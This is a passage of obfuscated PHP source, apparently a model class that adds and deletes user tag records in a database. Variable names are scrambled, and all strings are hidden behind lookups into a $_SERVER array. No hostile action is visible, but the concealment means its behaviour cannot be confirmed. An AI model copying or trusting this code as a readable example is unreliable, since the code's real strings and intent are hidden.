(!$‘©…¦ÖÊ) { return !1; } $­°€Š = $‘©…¦ÖÊ[$‡åÆàò[32]]; $©”Ä»îİ = $‘©…¦ÖÊ[$‡åÆàò[33]]; if (isset($‘©…¦ÖÊ[$‡åÆàò[496]])) { $©”Ä»îİ = $‘©…¦ÖÊ[$‡åÆàò[496]] == $‡åÆàò[91] ? $‡åÆàò[78] : $‡åÆàò[233]; } } $ş¼Ş¯Õ = array($‡åÆàò[1801] => USER_ID, $‡åÆàò[570] => $×²ÏÇŒ¢, $‡åÆàò[506] => $¼ÀÕñø, $‡åÆàò[507] => $©”Ä»îİ ? $©”Ä»îİ : $‡åÆàò[501], $‡åÆàò[505] => $­°€Š ? $­°€Š : $‡åÆàò[12], $‡åÆàò[2014] => 0); if ($this->where($ş¼Ş¯Õ)->find()) { return !1; } return $this->add($ş¼Ş¯Õ); } protected function removeFromTag($¯¦…²ø™, $Øœ½ÕË¯) { $‘Ã§»Ï =& $_SERVER[Î·Ü›öğ]; if (!Model($‘Ã§»Ï[2290])->listData($Øœ½ÕË¯)) { return !1; } if (is_array($¯¦…²ø™)) { $¯¦…²ø™ = array($‘Ã§»Ï[7], $¯¦…²ø™); } $ôª“˜†’ = array($‘Ã§»Ï[1801] => USER_ID, $‘Ã§»Ï[570] => $Øœ½ÕË¯, $‘Ã§»Ï[506] => $¯¦…²ø™); return $this->where($ôª“˜†’)->delete(); } protected function removeByTag($Ô´ş˜¹€) { $İ±ÃÃ” =& $_SERVER[Î·Ü›öğ]; if (!$Ô´ş˜¹€) { return !1; } $û™è¬†÷ = array($İ±ÃÃ”[1801] => USER_ID, $İ±ÃÃ”[570] => $Ô´ş˜¹€); return $this->where($û™è¬†÷)->delete(); } protected function removeBySource($Ï„­’®•) { $õ­€é÷Ñ =& $_SERVER[Î·Ü›öğ]; if (is_array($Ï„­’®•)) { $Ï„­’®• = array($õ­€é÷Ñ[7], $Ï„­’®•); } $ğÈÇÜµ³ = array($õ­€é÷Ñ[1801] => USER_ID, $õ­€é÷Ñ[570] => array($õ­€é÷Ñ[1113], 0), $õ­€é÷Ñ[506] => $Ï„­’®•); return $this->where($ğÈÇÜµ³)->delete(); } }